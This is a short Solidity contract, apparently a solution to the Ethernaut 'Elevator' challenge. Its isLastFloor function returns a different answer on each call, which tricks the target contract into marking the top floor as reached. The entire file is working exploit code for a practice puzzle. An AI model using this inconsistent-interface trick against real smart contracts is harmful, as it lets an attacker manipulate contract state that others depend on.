// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorHack {
    bool public lastFloor = true;

    function attack(address _elevator) public {
        IElevator(_elevator).goTo(2);
    }

    function isLastFloor(
        uint256 /* floor */
    ) public returns (bool) {
        return lastFloor = !lastFloor;
    }
}
